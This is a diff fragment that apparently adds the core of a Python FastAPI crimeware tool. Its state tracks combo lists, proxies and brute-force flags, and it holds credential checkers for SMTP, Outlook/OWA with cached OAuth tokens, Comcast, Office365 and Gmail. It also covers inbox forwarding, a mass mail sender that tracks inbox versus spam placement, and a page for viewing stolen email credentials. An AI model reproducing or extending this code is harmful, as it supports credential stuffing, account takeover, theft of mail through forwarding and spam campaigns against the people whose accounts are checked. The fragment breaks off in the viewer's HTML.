+        self.combos: List[str] = []; self.proxies: List[str] = []; self.parsed_proxies: List[Dict] = []; self.threads: int = 100
+        self.start_time: float = 0.0; self.lock = threading.Lock(); self.live_hits: List[Dict[str, str]] = []
+        self.search_count: int = 0; self.search_hits: int = 0; self.search_fail: int = 0
+        self.search_running: bool = False; self.search_results: List[Any] = []
+        self.disc_total = 0; self.disc_done = 0; self.disc_found = 0; self.disc_running = False
+        self.session_dir = ""
+        # SMTP Checker Stats
+        self.smtp_checked = 0; self.smtp_live = 0; self.smtp_bad = 0
+        self.smtp_running = False; self.smtp_combos: List[str] = []
+        self.smtp_results: List[Dict[str, str]] = []
+        # Sender Stats
+        self.sender_running = False; self.sent_count = 0; self.failed_count = 0
+        self.inbox_count = 0; self.spam_count = 0; self.sender_log: List[str] = []
+        self.smtp_log: List[str] = []
+        self.smtp_cache: Dict[str, Any] = {}; self.is_extracting = False
+        self.smtp_brute = False
+        # Outlook Checker Stats
+        self.outlook_checked = 0; self.outlook_hits = 0; self.outlook_custom = 0; self.outlook_bad = 0
+        self.outlook_running = False; self.outlook_results: List[Dict[str, Any]] = []
+        self.outlook_log: List[str] = []
+        # OWA OAuth token cache: user -> {token, cid}
+        self.oauth_tokens: Dict[str, Dict[str, str]] = {}
+        self.owa_folder_map: Dict[str, Dict[str, str]] = {}
+        # NEW: Comcast & Office365 Checker Stats
+        self.comcast_checked = 0; self.comcast_live = 0; self.comcast_running = False
+        self.office365_checked = 0; self.office365_live = 0; self.office365_running = False
+        self.comcast_results: List[Dict[str, Any]] = []; self.office365_results: List[Dict[str, Any]] = []
+        # NEW: Gmail Checker Stats
+        self.gmail_checked = 0; self.gmail_live = 0; self.gmail_running = False
+        self.gmail_results: List[Dict[str, Any]] = []
+        # NEW: Inbox Forwarding Stats
+        self.forward_running = False; self.forward_total = 0; self.forward_success = 0; self.forward_failed = 0
+        self.forward_log: List[str] = []; self.forward_results: List[Dict[str, Any]] = []
+        # NEW: Security & Multi-Pass Stats
+        self.two_factor = 0; self.multi_pass_hits = 0; self.bad_pass = 0
+        self.duplicates = 0 # Track duplicate combos found during extraction
+        
+        # SMS Notification Settings - REMOVED
+
+        self.load_settings()
+
+    def load_settings(self):
+        try:
+            conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
+            cursor.execute("SELECT key, value FROM settings")
+            for key, val in cursor.fetchall():
+                if key == 'max_retries': self.max_retries = int(val)
+                elif key == 'retry_delay': self.retry_delay = int(val)
+                elif key == 'timeout': self.timeout = int(val)
+                elif key == 'timeout': self.timeout = int(val)
+            conn.close()
+        except: pass
+
+    def save_setting(self, key, val):
+        try:
+            conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
+            cursor.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, str(val)))
+            conn.commit(); conn.close()
+            if key == 'max_retries': self.max_retries = int(val)
+            elif key == 'retry_delay': self.retry_delay = int(val)
+            elif key == 'timeout': self.timeout = int(val)
+            elif key == 'sms_enabled': self.sms_enabled = val == 'True'
+            elif key == 'sms_phone': self.sms_phone = val
+            elif key == 'sms_smtp_host': self.sms_smtp_host = val
+            elif key == 'sms_smtp_port': self.sms_smtp_port = int(val)
+            elif key == 'sms_smtp_user': self.sms_smtp_user = val
+            elif key == 'sms_smtp_pass': self.sms_smtp_pass = val
+            elif key == 'sms_smtp_sec': self.sms_smtp_sec = val
+        except: pass
+
+state = GlobalState()
+
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    init_db()
+    yield
+
+app = FastAPI(lifespan=lifespan)
+
+@app.get("/health")
+def health():
+    return {"status": "ok", "routes": [r.path for r in app.routes]}
+
+@app.get("/mail_viewer")
+async def mail_viewer(email: str = None):
+    """Mobile-friendly viewer for email credentials."""
+    html = """
+    <html><head><meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+    body{font-family:Arial,sans-serif;background:#111;color:#eee;padding:20px}
+    .container{max-width:600px;margin:auto}
+    input{width:100%;padding:10px;margin:10px 0;font-size:1rem}
+    button{padding:10px 20px;font-size:1rem;background:#1ed760;color:#000;border:none;border-radius:4px;cursor:pointer}
+    .result{margin-top:20px;padding:10px;background:#222}
+    </style>
